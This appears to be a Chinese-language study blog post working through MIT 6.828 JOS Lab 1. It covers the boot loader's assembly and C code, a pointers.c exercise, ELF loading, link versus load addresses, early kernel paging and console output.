<p>当BIOS启动，它设置了一个中断描述符表并初始化多个设备比如VGA显示器。在初始化PCI总线和所有重要的设备之后，它寻找可引导的设备，之后读取 <em>boot loader</em> 并转移控制。</p>
<h2 id="Part_2_3A_The_Boot_Loader"><a href="#Part_2_3A_The_Boot_Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>接下来是512 byte区域的扇区，它是硬盘最小调度单位，每次读或写操作都至少是一个扇区，并且还会进行对齐。BIOS加载引导扇区到内存中是从物理地址0x7c00到0x7dff，然后使用jmp指令设置 CS:IP 为 0000:7c00。因此 boot loader 不能超过512字节，它执行两个功能：</p>
<ol>
<li><p>boot loader 切换处理器从实模式到保护模式，只有这样才能访问大于1MB的物理地址空间。</p>
</li>
<li><p>boot loader 从硬盘中读取内核。</p>
</li>
</ol>
<h3 id="u52A0_u8F7DBoot"><a href="#u52A0_u8F7DBoot" class="headerlink" title="加载Boot"></a>加载Boot</h3><h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>通过 <code>b *0x7c00</code> 设置断点，接着 <code>c</code> 运行到断点处，使用 <code>x/i</code> 来查看当前的指令。</p>
<ul>
<li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? 在哪执行了32位代码？</p>
<p>  <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x7c32</code> 这条指令之后，也就是 <code>boot.S</code> 中的 <code>ljmp $PROT_MODE_CSEG, $protcseg</code> ，地址符号就变成 0x7c32 了。</p>
</li>
<li><p>What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded?最后一条 boot loader 指令，第一条内核指令？</p>
<p>  boot loader 最后一步是加载kernel，所以在 <code>boot/main.c</code> 中可以找到 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 这行代码，上面的注释 <code>call the entry point from the ELF header</code> 表明这是准备读取ELF头。<br>  通过 <code>objdump -x obj/kern/kernel</code> 可以查看kernel的信息，其中开头就有 <code>start address 0x0010000c</code>，通过 <code>b *0x10000c</code>然后在 <code>c</code> 能得到执行的指令是 <code>movw   $0x1234,0x472</code>，当然在 <code>kern/entry.S</code> 中也能找到这个指令。</p>
</li>
<li><p>Where is the first instruction of the kernel?</p>
<p>  同上一条的问题，存在kern/entry.S中。</p>
</li>
</ul>
<ul>
<li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? </p>
<p>  关于查看kernel信息的，通过 <code>objdump -h obj/kern/kernel</code> 可以得出相关信息。</p>
</li>
</ul>
<p>接下来就可以来完成 Exercise 3。设置一个断点在地址0x7c00处，这是boot sector被加载的位置。然后让程序继续运行直到这个断点。跟踪<code>/boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的x/i指令来获取去任意一个机器指令的反汇编指令，把源文件<code>boot.S</code>文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p>
<p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出和readsect()c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p>
<p>首先查看boot.S文件，在开头可以看到</p>
<pre><code>start:
  .code16                     # 16位汇编模式
  cli                         # 关中断
  cld                         # String operations increment
</code></pre><p><code>cld</code> 是串操作指令，用来操作方向标志位DF，使DF=0。</p>
<pre><code>  # Set up the important data segment registers (DS, ES, SS).
  xorw    %ax,%ax             # Segment number zero
  movw    %ax,%ds             # -&gt; Data Segment
  movw    %ax,%es             # -&gt; Extra Segment
  movw    %ax,%ss             # -&gt; Stack Segment
</code></pre><p>将DS、ES、SS寄存器清零。</p>
<pre><code>  # Enable A20:
  #   For backwards compatibility with the earliest PCs, physical
  #   address line 20 is tied low, so that addresses higher than
  #   1MB wrap around to zero by default.  This code undoes this.
seta20.1:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.1

  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64
  outb    %al,$0x64

seta20.2:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.2

  movb    $0xdf,%al               # 0xdf -&gt; port 0x60
  outb    %al,$0x60
</code></pre><p>开启A20，关于为什么要开A20,可以看<a href="https://www.zhihu.com/question/29375534" target="_blank" rel="external">知乎:OS boot 的时候为什么要 enable A20？</a>。</p>
<p><code>inb     $0x64,%al</code> 把0x64端口(8042键盘控制器)的状态写入al中（inb代表IO端口读）, 之后 <code>testb   $0x2,%al</code> 判断al的第二位是否为0，不为0就循环执行seta20.1。这里第二位代表输入缓冲区是否满了。接着0xd1放入0x64端口。最后将0xdf放入0x60端口，代表开启A20地址线了。</p>
<pre><code>  # Switch from real to protected mode, using a bootstrap GDT
  # and segment translation that makes virtual addresses 
  # identical to their physical addresses, so that the 
  # effective memory map does not change during the switch.
  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE_ON, %eax
  movl    %eax, %cr0
</code></pre><p>切换到保护模式后，加载GDT(Global Descriptor Table)，接着修改了cr0寄存器的值，$CR0_PE_ON值为0x1，代表启动保护模式的flag标志。</p>
<pre><code>  # Jump to next instruction, but in 32-bit code segment.
  # Switches processor into 32-bit mode.
  ljmp    $PROT_MODE_CSEG, $protcseg
</code></pre><p>也就是 <code>0x7c2d:    ljmp   $0x8,$0x7c32</code> 跳转到了32位代码段。</p>
<pre><code>protcseg:
  # Set up the protected-mode data segment registers
  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector
  movw    %ax, %ds                # -&gt; DS: Data Segment
  movw    %ax, %es                # -&gt; ES: Extra Segment
  movw    %ax, %fs                # -&gt; FS
  movw    %ax, %gs                # -&gt; GS
  movw    %ax, %ss                # -&gt; SS: Stack Segment
</code></pre><p>修改了这些寄存器的值。</p>
<pre><code>  # Set up the stack pointer and call into C.
  movl    $start, %esp
  call bootmain
</code></pre><p>设置栈指针，接着开始调用bootmain函数。</p>
<pre><code>    7d15:    55                       push   %ebp
    7d16:    89 e5                    mov    %esp,%ebp
    7d18:    56                       push   %esi
    7d19:    53                       push   %ebx
</code></pre><p>首先做进入函数的准备工作</p>
<pre><code>    // read 1st page off disk
    readseg((uint32_t) ELFHDR, SECTSIZE*8, 0);
    7d1a:    6a 00                    push   $0x0
    7d1c:    68 00 10 00 00           push   $0x1000
    7d21:    68 00 00 01 00           push   $0x10000
    7d26:    e8 b1 ff ff ff           call   7cdc &lt;readseg&gt;
</code></pre><p>接着调用readseg函数，这个函数有3个参数，第一个是物理地址，第二个是页的大小，第三个是偏移量。</p>
<p><code>0x7ceb:    shr    $0x9,%edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 这条代码前面的除法部分，得出扇区号。</p>
<p><code>0x7cee:    add    %ebx,%esi</code> 执行了 <code>end_pa = pa + count;</code> 计算出这个扇区结束的物理地址。</p>
<p><code>0x7cf0:    inc    %edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 中的加1。</p>
<p><code>0x7cf1:    and    $0xfffffe00,%ebx</code> 执行了 <code>pa &amp;= ~(SECTSIZE - 1);</code>。</p>
<pre><code>0x7cf7:    cmp    %esi,%ebx
0x7cf9:    jae    0x7d0d
</code></pre><p>执行 <code>while (pa &lt; end_pa)</code> 这个循环判断语句。</p>
<p>之后几条汇编是为readsect函数做准备，这个函数是读取扇区内容的。</p>
<p><img src="3.png" alt=""></p>
<p>判断 <code>ELFHDR-&gt;e_magic != ELF_MAGIC</code> 这个条件。</p>
<p><img src="4.png" alt=""></p>
<p>加载程序段由这几个部分汇编构成</p>
<pre><code>7d3a:    a1 1c 00 01 00           mov    0x1001c,%eax
7d3f:    0f b7 35 2c 00 01 00     movzwl 0x1002c,%esi
7d46:    8d 98 00 00 01 00        lea    0x10000(%eax),%ebx
7d4c:    c1 e6 05                 shl    $0x5,%esi
7d4f:    01 de                    add    %ebx,%esi
</code></pre><p>之后循环调用readseg函数，将Program Header Table中表项读入内存。</p>
<p>最后一步就是</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>ELFHDR<span class="token operator">-></span>e_entry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>至此，Exercise 3算是走了一遍过程。</p>
<h3 id="u52A0_u8F7D_u5185_u6838"><a href="#u52A0_u8F7D_u5185_u6838" class="headerlink" title="加载内核"></a>加载内核</h3><h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>阅读 K&amp;R 的 <em>The C Programming Language</em>， 理解 <a href="https://pdos.csail.mit.edu/6.828/2016/labs/lab1/pointers.c" target="_blank" rel="external">pointers.c</a>.</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>
<span class="token keyword">int</span> i<span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1: a = %p, b = %p, c = %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>结果是 <code>1: a = 0x7fff5fbff810, b = 0x100600000, c = 0x100000000</code></p>
<p>a是数组，所以输出的0x7fff5fbff810是数组a的首地址。b是指针，指向malloc分配的空间的起始地址0x100600000。c是未定义的指针。</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> a<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>
c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>c = a;</code> 让指针c指向a指向的地址。先是for循环，给数组a赋值为100、101、102、103。因为c现在和a指向同一区域，所以c[0]修改的是数组a的第一个元素，所以结果是 <code>2: a[0] = 200, a[1] = 101, a[2] = 102, a[3] = 103</code>.</p>
<pre class=" language-c"><code class="language-c">c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">301</span><span class="token punctuation">;</span>
<span class="token number">3</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">302</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>三种修改数组中值的方法，其中第三种没怎么见过，有点像汇编里地址偏移的方式，3[c]就是c的地址偏移到第三个元素的地址，所以输出为 <code>3: a[0] = 200, a[1] = 300, a[2] = 301, a[3] = 302</code>.</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>移动指针指向了数组的第二个元素，所以输出为 <code>4: a[0] = 200, a[1] = 400, a[2] = 301, a[3] = 302</code>.</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>c = (int *) ((char *) c + 1);</code> 这一行代码先将c强制转型为char指针，接着指针加1，再强转回int指针。一步一步来看，首先可以确定在执行这行代码之前，c的地址为 0x7fff5fbff814(因为系统是64位的，其实地址为 0x00007fff5fbff814，只不过前面的0省略了)，所以强转为char指针后加1得到的地址为 0x7fff5fbff815，因为char只占一个字节。因为c原来值为400，也就是十六进制的0x190.在c强转之前，打印 (char <em>) c 的地址为 0x7fff5fbff814，查看 </em>(char *) c 的值为 ffffff90。这里要说明一下，为什么90前面都是ffffff，这不是fff团对单身狗的报复，而是 </p>
<pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>中，%x 将值强转为unsigned int，unsigned int在我的系统中占4个字节。所以打印出来有8位。用 <code>%c</code> 可以得到真正这个地方的值，只不过是八进制的。当然查看这个值最方便的还是声明个变量，然后在Xcode打断点进行查看。声明一个变量 <code>char *p= (char *)c;</code>, 使用 <code>p++</code> 进行单步调试，可以查看 <code>*p</code> 的值。</p>
<pre><code>0x7fff5fbff814  0x90
0x7fff5fbff815  0x01
0x7fff5fbff816  0x0
0x7fff5fbff817  0x0
0x7fff5fbff818    2d
0x7fff5fbff819    1
0x7fff5fbff81a    0
0x7fff5fbff81b    0
</code></pre><p>500的十六进制是0x1F4, 因为char指针加1使指针指向 0x7fff5fbff815，所以修改其值为0xF4，0x7fff5fbff816为0x1，0x7fff5fbff818为0x0，所以a[1]值变为0x1F490=128144，a[2]为0x100=256。所以输出 <code>a[0] = 200, a[1] = 128144, a[2] = 256, a[3] = 302</code>。</p>
<pre class=" language-c"><code class="language-c">b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"6: a = %p, b = %p, c = %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>b是int指针，所以a + 1即a的地址加上sizeof(int *)也就是4，所以指向a[1]。而c参考上一段的介绍，可知道是在char指针情况下进行加1，所以地址偏移1。所以输出 <code>6: a = 0x7fff5fbff810, b = 0x7fff5fbff814, c = 0x7fff5fbff811</code>。</p>
<p>接着就可以来学习内核。为了理解 <code>boot/main.c</code>， 需要了解ELF二进制文件。编译并链接比如JOS内核这样的C程序，编译器会将源文件(.c)转为包含汇编指令的目标文件(.o)。接着链接器把所有的目标文件组合成一个单独的二进制镜像（binary image），比如 <code>obj/kern/kernel</code>，这种文件就是ELF(是可执行可链接形式的缩写)。</p>
<p>当前只需要知道，可执行的ELF文件由带有加载信息的头，多个程序段表组成。每个程序段表是一个连续代码块或者数据，它们要被加载到内存具体地址中。boot loader 不修改源码和数据，直接加载到内存中并运行。</p>
<p>ELF开头是固定长度的 <em>ELF头</em>，之后是一个可变长度的程序头，它列出了需要加载的程序段。ELF头的定义在 <code>inc/elf.h</code> 中。主要学习以下3个程序段：</p>
<ul>
<li>.text: 程序执行指令</li>
<li>.rodata:只读数据，比如ASCII字符串</li>
<li>.data: 存放程序初始化的数据段，比如有初始值的全局变量。</li>
</ul>
<p>当链接器计算程序内存布局时，会在内存里紧挨着.data段的.bss段中保留空间给未初始化的全局变量。C规定未初始化的全局变量为0。因此没必要在ELF的.bss段储存内容，链接器只储存了.bss段的地址和大小。</p>
<p>使用 <code>objdump -h obj/kern/kernel</code> 可以查看ELF头的相关信息。</p>
<p><img src="5.png" alt=""></p>
<p>重点关注 .text段 的VMA(链接地址)和LMA(加载地址)，段的加载地址即加载进内存的地址。段的链接地址就是这个段预计在内存中执行的地址。链接程序有多种编码链接地址的方法。通常链接和加载的地址是一致的。查看boot loader的 .text段</p>
<pre class=" language-bash"><code class="language-bash">objdump -h obj/boot/boot.out
</code></pre>
<p><img src="6.png" alt=""></p>
<p>boot loader使用 <em>ELF程序头(Program Headers)</em> 确定如何加载段。程序头指明ELF中哪部分加载进内存和其所在的地址。使用一下命令查看</p>
<pre class=" language-bash"><code class="language-bash">objdump -x obj/kern/kernel
</code></pre>
<p><img src="7.png" alt=""></p>
<p>其中Program Headers下面列出的程序头中，开头的LOAD代表已经加载到内存中了，另外显示出了虚拟地址(vaddr)，物理地址(paddr)以及存放区域的大小(memsz和filesz)。</p>
<p>回到 <code>boot/main.c</code>， ph-&gt;p_pa是每个程序头包含的段目的物理地址。</p>
<p>BIOS把引导扇区加载到内存地址0x7c00，这也就是引导扇区的加载地址和链接地址。在 <code>boot/Makefrag</code> 中，是通过传 -Ttext 0x7C00 这个参数给链接程序设置了链接地址，因此链接程序在生成的代码中产生正确的内存地址。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 <code>boot/Makefrag</code> 让其加载地址出错。查看这个文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span>OBJDIR<span class="token variable">)</span></span>/boot/boot: <span class="token variable"><span class="token variable">$(</span>BOOT_OBJS<span class="token variable">)</span></span>
    @echo + ld boot/boot
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>LD<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>LDFLAGS<span class="token variable">)</span></span> -N -e start -Ttext 0x7C00 -o <span class="token variable">$@</span>.out $^
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>OBJDUMP<span class="token variable">)</span></span> -S <span class="token variable">$@</span>.out <span class="token operator">></span><span class="token variable">$@</span>.asm
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>OBJCOPY<span class="token variable">)</span></span> -S -O binary -j .text <span class="token variable">$@</span>.out <span class="token variable">$@</span>
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span>perl boot/sign.pl <span class="token variable"><span class="token variable">$(</span>OBJDIR<span class="token variable">)</span></span>/boot/boot
</code></pre>
<p>可以发现 -Ttext 后面的参数就是入口地址。如果把这个值修改为0x8C00，保存后回到lab1文件夹下进行make，查看 <code>obj/boot/boot.asm</code> 会发现，开头</p>
<pre><code>Disassembly of section .text:

00008c00 &lt;start&gt;:
.set CR0_PE_ON,      0x1         # protected mode enable flag

.globl start
start:
  .code16                     # Assemble for 16-bit mode
  cli                         # Disable interrupts
    8c00:    fa                       cli    
  cld                         # String operations increment
    8c01:    fc                       cld
</code></pre><p>可以发现起始地址从原来的 00007c00 变为 00008c00。虽然此时在0x7c00处打断点然后运行时正常的，但是继续si以后会在 <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x8c32</code> 出循环，同时qemu端口出现了错误。因为不能ljmp到$0x7c32而是调到了$0x8c32，所以无法执行正确的指令。查看 <code>boot.asm</code> 可以知道上面这个指令是 <code>ljmp    $PROT_MODE_CSEG, $protcseg</code>，是为了进入32位模式的。</p>
<p>除了段信息，ELF头中的e_entry字段也很重要。这个字段保存了程序入口点(entry point)的链接地址，也就是程序执行的text字段中的内存地址。使用一下命令查看<code>objdump -f obj/kern/kernel</code></p>
<p><img src="8.png" alt=""></p>
<h4 id="Exercise_6"><a href="#Exercise_6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><p>使用GDB的 <code>x/Nx ADDR</code> 可以打印内存地址ADDR的 <em>N</em> 个字。字的大小分情况的，GDB中一个字是两个字节。</p>
<p>查看BIOS启动时0x00100000处的8歌字，然后继续到boot loader进入内核的位置，再查看，发现8个字的内容不同。</p>
<p>现在0x7c00处打断点，然后运行到断点处，使用 <code>x/8x 0x100000</code> 可以看到</p>
<p><img src="9.png" alt=""></p>
<p>根据之前的看到程序入口点是 0x10000c ，所以在 0x10000c 处打断点运行，同样可以看到</p>
<p><img src="10.png" alt=""></p>
<p>使用 <code>x/10i 0x100000</code> 会看到</p>
<p><img src="11.png" alt=""></p>
<p>应该能感觉到 0x100000 处存放的其实就是程序指令段，也就是说 bootmain 函数会把内核的程序段送到内存 0x100000 处。</p>
<h2 id="Part_3_3A_The_Kernel"><a href="#Part_3_3A_The_Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><h3 id="u4F7F_u7528_u865A_u62DF_u5185_u5B58"><a href="#u4F7F_u7528_u865A_u62DF_u5185_u5B58" class="headerlink" title="使用虚拟内存"></a>使用虚拟内存</h3><p>boot loader 的链接地址和加载地址是一样的，然而 kernel 的链接地址和加载地址有些差异。查看 <code>kern/kernel.ld</code> 可以发现内核地址在 0xF0100000。</p>
<p>操作系统内核通常被链接并且运行在非常高的虚拟地址，比如文件里看到的 0xf0100000，为了让处理器虚拟地址空间的低地址部分给用户程序使用。</p>
<p>许多机器没有地址为 0xf0100000 的物理内存，所以内核不能放在那儿。因此使用处理器内存管理硬件将虚拟地址 0xf0100000 (内核希望运行的链接地址)映射到物理地址 0x00100000 (boot loader加载内核后所放的物理地址)。尽管内核虚拟地址很高，但加载进物理地址位于1MB的地方仅仅高于BIOS的ROM。这需要PC至少有1MB的物理内存。</p>
<p>在下一个lab，会映射物理地址空间底部256MB，也就是 0x00000000 到 0x0fffffff，到虚拟地址 0xf0000000 ~ 0xffffffff。所以JOS只使用物理内存开始的256MB。</p>
<p>目前，只是映射了物理内存开始的4MB， 使用手写的静态初始化页目录和也表在 <code>kern/entrypgdir.c</code>。当 <code>kern/entry.S</code> 设置 <code>CR0_PG</code> 标记，存储器引用就变为虚拟地址，即存储器引用是由虚拟存储器硬件转换为物理地址的虚拟地址。<code>entry_pgdir</code> 将虚拟地址 0xf0000000 ~ 0xf0400000 转换为物理地址 0x00000000 ~ 0x00400000，虚拟地址 0x00000000 ~ 0x00400000 也转换为物理地址 0x00000000 ~ 0x00400000。任何不在这两个范围内的虚拟地址会导致硬件异常。</p>
<h4 id="Exercise_7"><a href="#Exercise_7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><p>追踪JOS内核并停在 <code>movl %eax, %cr0</code>。查看内存 0x00100000 和 0xf0100000。接着使用 <code>stepi</code> 来看上面两个地址里内容的变化。</p>
<p>若注释了 <code>kern/entry.S</code> 的 <code>movl %eax, %cr0</code>, 查看第一个出现问题的指令是什么。</p>
<p>查看 <code>kern/entry.S</code> 发现 <code>_start</code> 是ELF入口点，exercise 5 提到了入口点是 0x0010000c. 所以在0x0010000c处打断点。</p>
<pre><code>(gdb) b *0x0010000c
</code></pre><p>接着输入 <code>c</code> 使程序运行到断点处。使用 <code>x/4i</code> 来查看后四条指令,发现 0x00100000 和 0xf0100000 不同。</p>
<p><img src="12.png" alt=""></p>
<p>在执行完6次si后，终于 0x00100000 和 0xf0100000 处内容相同。</p>
<p><img src="13.png" alt=""></p>
<p>也就是说，0xf0100000 的内容被映射到 0x00100000。</p>
<p>注释 <code>movl %eax, %cr0</code> 后，<code>make clean</code> 之后重新编译，再运行。一步步 si 后出现了问题。</p>
<p><img src="14.png" alt=""></p>
<p>在0x10002a处的jmp指令，要跳到 0xf010002c 处， 然而因为没有分页管理，不会进行虚拟地址映射到物理地址的转化，再另一个窗口可以看到错误信息，访问地址超出内存。</p>
<p><img src="15.png" alt=""> </p>
<h3 id="u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0"><a href="#u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0" class="headerlink" title="格式化输出到控制台"></a>格式化输出到控制台</h3><p>分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的代码。</p>
<h4 id="Exercise_8"><a href="#Exercise_8" class="headerlink" title="Exercise 8"></a>Exercise 8</h4><p>完成指定输出”%o”格式字符串的代码。</p>
<p>首先分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的关系。</p>
<p><code>kern/printf.c</code>里的 <code>vcprintf</code>, <code>cprintf</code> 都调用 <code>lib/printfmt.c</code> 的 <code>vprintfmt</code>。<code>kern/printf.c</code>里的 <code>putch</code> 调用 <code>kern/console.c</code> 的 <code>cputchar</code>。<code>lib/printfmt.c</code> 里也有 <code>putch</code>。</p>
<p>所以 <code>kern/printf.c</code> 和 <code>lib/printfmt.c</code> 依赖 <code>kern/console.c</code>。</p>
<p>首先先看看 <code>putch</code> 里调用的 <code>cputchar</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 'High'-level console I/O.  Used by readline and cprintf.</span>

<span class="token keyword">void</span>
<span class="token function">cputchar</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">cons_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// output a character to the console</span>
<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">serial_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">lpt_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cga_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
